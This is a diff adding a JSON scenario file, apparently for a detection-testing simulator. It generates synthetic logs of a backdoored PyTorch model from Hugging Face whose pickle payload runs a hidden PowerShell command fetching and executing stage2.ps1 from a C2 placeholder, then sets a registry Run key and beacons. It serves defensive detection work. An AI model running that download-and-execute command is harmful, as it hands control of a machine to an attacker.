@@ -1,0 +1,155 @@
+[
+  {
+    "name": "ML Engineer Pulls Model From Public Hub",
+    "delay": 1.0,
+    "events": [
+      {
+        "source": "proxy",
+        "event_type": "proxy",
+        "url": "https://huggingface.co/dark-labs/finance-sentiment-v2/resolve/main/pytorch_model.bin",
+        "http_method": "GET",
+        "http_status": 200,
+        "user_agent": "{{RANDOM_UA}}",
+        "content_type": "application/octet-stream",
+        "AccountName": "{{PERSONA_USER}}",
+        "DeviceName": "{{PERSONA_HOST}}",
+        "SourceIP": "{{RANDOM_IP}}",
+        "mitre": {
+          "tactic": "Initial Access",
+          "technique_id": "T1195.002",
+          "technique_name": "Supply Chain Compromise: Compromise Software Supply Chain"
+        },
+        "atlas": {
+          "id": "AML.T0010",
+          "name": "AI Supply Chain Compromise"
+        },
+        "killchain_phase": "initial-access"
+      }
+    ]
+  },
+  {
+    "name": "Model Load Triggers Pickle Deserialization Payload",
+    "delay": 0.5,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "python.exe",
+        "FolderPath": "C:\\Users\\{{PERSONA_USER}}\\AppData\\Local\\Programs\\Python\\Python313",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "python.exe -c \"import torch; torch.load('pytorch_model.bin')\"",
+        "AccountName": "{{PERSONA_USER}}",
+        "DeviceName": "{{PERSONA_HOST}}",
+        "mitre": {
+          "tactic": "Execution",
+          "technique_id": "T1059.006",
+          "technique_name": "Command and Scripting Interpreter: Python"
+        },
+        "is_malicious": true,
+        "killchain_phase": "execution"
+      },
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "cmd.exe",
+        "FolderPath": "C:\\Windows\\System32",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "cmd.exe /c powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{{CNC_IP}}/stage2.ps1')\"",
+        "AccountName": "{{PERSONA_USER}}",
+        "DeviceName": "{{PERSONA_HOST}}",
+        "parent_process_name": "python.exe",
+        "parent_process_id": "{{RANDOM_PID}}",
+        "mitre": {
+          "tactic": "Execution",
+          "technique_id": "T1059.001",
+          "technique_name": "Command and Scripting Interpreter: PowerShell"
+        },
+        "is_malicious": true,
+        "killchain_phase": "execution"
+      }
+    ]
+  },
+  {
+    "name": "Persistence via Registry Run Key",
+    "delay": 1.0,
+    "events": [
+      {
+        "source": "registry",
+        "event_type": "registry",
+        "ActionType": "RegistryValueSet",
+        "RegistryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "RegistryValueName": "MLRuntimeUpdater",
+        "RegistryValueData": "C:\\Users\\{{PERSONA_USER}}\\AppData\\Local\\Temp\\mlruntime.exe",
+        "DeviceName": "{{PERSONA_HOST}}",
+        "AccountName": "{{PERSONA_USER}}",
+        "mitre": {
+          "tactic": "Persistence",
+          "technique_id": "T1547.001",
+          "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+        },
+        "is_malicious": true,
+        "killchain_phase": "persistence"
+      }
+    ]
+  },
+  {
+    "name": "C2 Beaconing From Compromised MLOps Workstation",
+    "delay": 2.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "network_connection",
+        "DeviceAction": "allowed",
+        "Protocol": "TCP",
+        "SourcePort": "{{RANDOM_PORT}}",
+        "DestinationIP": "{{CNC_IP}}",
+        "DestinationPort": 443,
+        "DeviceName": "{{PERSONA_HOST}}",
+        "AccountName": "{{PERSONA_USER}}",
+        "multiply": 5,
+        "mitre": {
+          "tactic": "Command and Control",
+          "technique_id": "T1071.001",
+          "technique_name": "Application Layer Protocol: Web Protocols"
+        },
+        "is_malicious": true,
+        "killchain_phase": "command-and-control"
+      }
+    ]
+  },
+  {
+    "name": "EDR Flags Backdoored Model Artifact",
+    "delay": 0.5,
+    "events": [
+      {
+        "source": "security_alert",
+        "event_type": "security_alert",
+        "alert_name": "Malicious Code Execution From ML Model Deserialization",
+        "alert_type": "AI Supply Chain Compromise",
+        "description": "Loading a model artifact ({{PERSONA_USER}}'s pytorch_model.bin download from an unverified Hugging Face repository) resulted in unexpected child process creation and outbound C2 beaconing, consistent with a pickle deserialization backdoor embedded in the model file.",
+        "severity": "Critical",
+        "confidence_level": "High",
+        "confidence_score": 0.91,
+        "tactics": "['Initial Access', 'Execution', 'Persistence', 'Command and Control']",
+        "techniques": "['T1195.002', 'T1059.006', 'T1547.001', 'T1071.001']",
+        "compromised_entity": "{{PERSONA_HOST}}",
+        "remediation_steps": "Isolate the host, remove the registry run key, quarantine the model artifact, verify model provenance/signatures before any future load, block the C2 IP.",
+        "mitre": {
+          "tactic": "Initial Access",
+          "technique_id": "T1195.002",
+          "technique_name": "Supply Chain Compromise: Compromise Software Supply Chain"
+        },
+        "atlas": {
+          "id": "AML.T0010",
+          "name": "AI Supply Chain Compromise"
+        },
+        "is_malicious": true,
+        "killchain_phase": "initial-access",
+        "expected_detection": true,
+        "detection_guidance": "Alert on process trees where a Python process loading a model file (torch.load / pickle.load without weights_only) spawns cmd.exe/powershell.exe as a child, followed by a new autorun registry value and outbound beaconing from the same host."
+      }
+    ]
+  }
+]
